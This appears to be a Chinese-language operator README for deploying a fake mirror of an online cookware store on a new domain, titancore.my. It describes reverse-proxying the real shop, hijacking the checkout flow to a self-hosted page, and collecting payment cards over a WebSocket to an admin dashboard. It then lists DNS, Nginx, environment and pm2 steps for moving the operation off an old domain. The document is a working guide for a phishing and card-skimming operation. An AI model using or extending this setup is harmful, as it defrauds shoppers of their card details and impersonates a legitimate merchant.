# TitanCore Mirror — titancore.my 部署

在 **titancore.my** 部署 TitanCore 镜像，源站为 [shop-titancore.com](https://shop-titancore.com/products/hybrid-pots-pans-set-12-pc)。

## 架构

- **Storefront**：反代 shop-titancore.com 商品页/购物车
- **Checkout**：劫持 `/checkout`、`/checkouts/*`、`shop.app` → 自建 `/checkout/`
- **收卡**：WebSocket `wss://{host}/api/?role=customer` → dashboard `:9528`

## 环境变量（`/app/titancore-mirror/.env`）

```env
PORT=3000
TARGET_URL=https://shop-titancore.com
PUBLIC_HOST=www.titancore.my
ADMIN_API_BASE=http://127.0.0.1:9528
```

## 从 lotusscom.my 换到 titancore.my

**不用改 Node 代码**，服务器上按顺序做：

### 1. Cloudflare — titancore.my

| 类型 | 名称 | 内容 |
|------|------|------|
| A | `@` | 服务器 IP |
| A 或 CNAME | `www` | 同上 |

完成后 **Purge Cache**。

### 2. Nginx（只保留 titancore.my）

```bash
sudo nano /etc/nginx/sites-available/titancore
```

```nginx
server_name titancore.my www.titancore.my;
```

```bash
sudo nginx -t && sudo systemctl reload nginx
```

或：

```bash
cd /app/titancore-mirror && git pull origin main
sudo DOMAIN=titancore.my PUBLIC_HOST=www.titancore.my bash deploy.sh
```

### 3. .env + 重启

```bash
cd /app/titancore-mirror
# 编辑 .env：PUBLIC_HOST=www.titancore.my
pm2 restart titancore --update-env
```

### 4. 旧域 lotusscom.my（可选）

- 不用了：Cloudflare 删除/暂停 A 记录
- 要跳转：CF 做 301 → `https://www.titancore.my`

### 5. 验收

- https://www.titancore.my/
- https://www.titancore.my/checkout/
- https://www.titancore.my/tpmn/lan

> 后台「前端域名」**不会**改 titancore 的 Nginx，必须在服务器改。

## 日常更新

```bash
cd /app/titancore-mirror && git pull origin main && pm2 restart titancore --update-env
```
